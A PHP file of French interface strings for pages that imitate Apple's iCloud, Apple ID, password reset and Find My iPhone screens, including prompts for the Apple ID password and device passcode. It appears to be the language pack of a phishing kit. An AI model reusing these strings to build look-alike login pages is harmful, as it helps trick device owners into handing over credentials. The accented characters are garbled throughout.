<?php
/**
 * Created by PhpStorm.
 * User: mustapha
 * Date: 5/6/17
 * Time: 10:31 PM
 */

//- iCloud sign in page
$lang[ 'Singin_message' ] = "Connexion � iCloud";
$lang[ 'Setup_message' ] = "instruction de configuration";
$lang[ 'Help_message' ] = "Aide et Support";
$lang[ 'Password_message' ] = "Mot de passe";
$lang[ 'RePassword_message' ] = "Mot de passe";
$lang[ 'NewRePassword_message' ] = "Nouveau mot de passe";
$lang[ 'incorrect_message' ] = "Votre identifiant Apple ou votre mot de passe est incorrect.";
$lang[ 'Keepsigin_message' ] = "Rester connect�";
$lang[ 'Forgotpassword_message' ] = "Identifiant�Apple ou mot de passe oubli� ?";
$lang[ 'Forgotpassword2_message' ] = "Mot de oubli� ?";
$lang[ 'DonthaveanAppleid_message' ] = "Pas d'identifiant apple?";
$lang[ 'Createyoursnow_message' ] = "Cr�ez le v�tre d�s maintenant.";
$lang[ 'Checkactivation_message' ] = "V�rifier l'�tat de verrouillage d'activation";
$lang[ 'Systemstatus_message' ] = "Etat du syst�me";
$lang[ 'Privacy_message' ] = "Politique de confidentialit�";
$lang[ 'Terms_message' ] = "Termes et conditions";
$lang[ 'Copyrights_message' ] = 'Copyright � ' . date( 'Y' ) . ' Apple Inc. Tous droits r�serv�s.';
$lang[ 'iCloudsettings_message' ] = "Configuration iCloud";
$lang[ 'Signout_message' ] = "";
$lang[ 'VerificationFailed_message' ] = "�chec de v�rification";
$lang[ 'OK_message' ] = "OK";

//-- iCloud apps
$lang[ 'Reminders_message' ] = "Rappels";
$lang[ 'Notes_message' ] = "Notes";
$lang[ 'iCloudDrive_message' ] = "iCloud Drive";
$lang[ 'Photos_message' ] = "Photos";
$lang[ 'Contacts_message' ] = "Contacts";
$lang[ 'Mail_message' ] = "Mail";
$lang[ 'Settings_message' ] = "R�glages";
$lang[ 'FindMyiPhone_message' ] = "Localiser mon iPhone";
$lang[ 'Keynote_message' ] = "Keynote";
$lang[ 'Numbers_message' ] = "Numbers";
$lang[ 'FindFriends_message' ] = "Mes amis";
$lang[ 'Pages_message' ] = "Pages";

//- Maps connect Page
$lang[ 'Help_messages' ] = "Aide";
$lang[ 'Createone_message' ] = "En cr�er un";
$lang[ 'ForgotIDorPassword_message' ] = "Identifiant ou mot de passe oubli� ?";

//- iTunes Connect Page
$lang[ 'iTunesConnect_message' ] = "iTunes Connect";
$lang[ 'Forgotpassword_message' ] = "Identifiant Apple ou mot de passe oubli� ?";
$lang[ 'Rememberme_message' ] = "Se souvenir de moi";

//- Apple ID Page
$lang[ 'SignIn_message' ] = "Se connecter";
$lang[ 'CreateYourAppleID_message' ] = "Cr�ez votre identifiant Apple";
$lang[ 'FAQ_message' ] = "FAQ";
$lang[ 'ManageyourAppleaccount_message' ] = "Cr�ez votre compte Apple";
$lang[ 'YourAppleIDorpasswordwasincorrect_message' ] = "Votre identifiant Apple ou votre mot de passe �tait incorrect";
$lang[ 'YouraccountforeverythingApple_message' ] = "Votre compte pour tout L'univers Apple.";
$lang[ 'AsingleAppleIDandpasswordgivesyouaccesstoallAppleservices_message' ] = "Un seul identifiant Apple et mot de passe vous donnent acc�s � tous les services Apple.";
$lang[ 'LearnmoreaboutAppleID_message' ] = "En savoir plus sur l?identifiant Apple";
$lang[ 'TermsofUse_message' ] = "Conditions d'utilisation";
$lang[ 'AppleOnlineStore_message' ] = "Boutique en ligne Apple";
$lang[ 'visitan_message' ] = "Visiter un";
$lang[ 'AppleRetailStore_message' ] = "Apple Retail Store";
$lang[ 'orfinda_message' ] = "Ou trouver un";
$lang[ 'reseller_message' ] = "Revendeur";
$lang[ 'Shopthe_message' ] = "Achetez le";
$lang[ 'AppleInfo_message' ] = "Apple Info";
$lang[ 'SiteMap_message' ] = "Plan du site";
$lang[ 'HotNews_message' ] = "Nouvelles chaudes";
$lang[ 'RSSFeeds_message' ] = "Flux RSS";
$lang[ 'ContactUs_message' ] = "Contactez nous";
$lang[ 'Search_message' ] = "Chercher";

//- Compass Page
$lang[ 'FindMyiPhone_message' ] = "Localiser mon iPhone";
$lang[ 'Sign-InRequired_message' ] = "Connexion requise";
$lang[ 'Not_message' ] = "Vous n'�tes pas";


//- Reset Password Page
$lang[ 'ResetPassword_message' ] = "R�initialiser votre mot de passe";
$lang[ 'PasswordChanged_message' ] = "Mot de passe changer";
$lang[ 'YourAppleIDpasswordfor_message' ] = "Votre mot de passe Apple ID pour";
$lang[ 'has_message' ] = "a";
$lang[ 'beenchanged_message' ] = "�t� chang�";
$lang[ 'SignintoyourAppleIDaccountpagenowto_message' ] = "Connectez-vous � votre page de compte Apple ID maintenant ";
$lang[ 'reviewyouraccountinformation_message' ] = "Passe en revue les informations de votre compte";
$lang[ 'GotoYourAccount_message' ] = "Acc�dez � votre compte";
$lang[ 'Enteranewpassword_message' ] = "Entrer un nouveau mot de passe";
$lang[ 'oldpassword_message' ] = "Ancien mot de passe";
$lang[ 'newpassword_message' ] = "Nouveau mot de passe";
$lang[ 'confirmpassword_message' ] = "Confirmez le mot de passe";
$lang[ 'Yourpasswordmusthave_message' ] = "Votre mot de passe doit avoir";
$lang[ 'ormorecharacters_message' ] = "Au moins 8 caract�res";
$lang[ 'Upperlowercaseletters_message' ] = "Des majuscules et des minuscules";
$lang[ 'Atleastonenumber_message' ] = "Au moins un chiffre";
$lang[ 'Strength_message' ] = "S�curit� :";
$lang[ 'Avoidpasswordsthatareeasytoguessorusedwithotherwebsites_message' ] = "�vitez les mots de passe que vous utilisez sur d?autres sites ou que quelqu?un d?autre pourrait ais�ment deviner.";
$lang[ 'YourAppleIDoroldpasswordwasincorrect_message' ] = "Votre identifiant Apple ou votre ancien mot de passe �tait incorrect";
$lang[ '_message' ] = "";
$lang[ '_message' ] = "";

//-- Login page
$lang[ 'Signsession_message' ] = "Connectez-vous pour commencer votre session";
$lang[ 'Alert_message' ] = "Alerte";
$lang[ 'Username_message' ] = "Nom d'utilisateur";
$lang[ 'Password_message' ] = "Mot de passe";
$lang[ 'Signin_message' ] = "Se connecter";
$lang[ 'User_message' ] = "Utilisateur";

//- General Lang
$lang[ 'appleid_message' ] = "Identifiant Apple";
$lang[ 'Cancel_message' ] = "Annuler";
$lang[ 'required_message' ] = "Obligatoire";

//- Find my iphone page
$lang[ 'Alldevices_message' ] = "Tous mes appareils";
$lang[ 'Locating_message' ] = "Localisation";
$lang[ 'Alldevicesoffline_message' ] = "Tous mes appareils hors ligne";
$lang[ 'Nolocations_message' ] = "Aucun emplacement ne peut �tre affich� car tous vos appareils sont hors ligne.";
$lang[ 'hourago_message' ] = "Il ya 1 heure";
$lang[ 'Playsound_message' ] = "Faire sonner";
$lang[ 'Lostmode_message' ] = "Mode perdu";
$lang[ 'EraseiPhone_message' ] = "Effacer l'iPhone";
$lang[ 'Notifyfound_message' ] = "Avertissez-moi lorsque vous l'avez trouv�";
$lang[ 'Removeaccount_message' ] = "Supprimer du compte";
$lang[ 'Offline_message' ] = "Hors ligne";

//- Passcode Page
$lang['access'] = "Need to find your device? Get quick access to:";
$lang['enterpasscode'] = "Enter passcode to contiune.";


//- New Fmi Template
$lang['manageappleid'] = "G�rer votre compte Apple";
$lang['No_Devices'] = "Aucun appareil";
$lang['fmiSetup'] = "Configurez votre compte iCloud sur un iPhone, iPad, iPod touch ou Mac pour utiliser Localiser mon iPhone";
$lang['MY_DEVICES'] = "Tous les appareils";
$lang['REFRESH'] = "REFRESH";
$lang['Seen_just_now'] = "Maintenat";
$lang['Old_Location'] = "Ancien emplacement";


//- FMI PopUp

$lang['Enter_the_password_Apple'] = "Saisissez le mot de pass de votre identifiant Apple";
$lang['Apple_ID_Sign_Requested'] = "Se connecter � iCloud";
$lang['Turn_On_Send_Last_Location'] = "Envoyer la derniere position";
$lang['Allow_Find_My_iPhone_to_store_the_last'] = "Auorise Localiser mon iPhone � stocker la derniere position de cet appareil pendant 24 heurs.";
$lang['Not_Now'] = "Plus tard";
$lang['Turn_On'] = "Activer";
$lang['Your_Apple_ID_or_password_is_incorrect'] = "Votre identifiant Apple ou votre mot de pass est incorrect.";
$lang['Action'] = "Action";
$lang['Updating_location'] = "";
$lang['Try_Again'] = "R�essayer";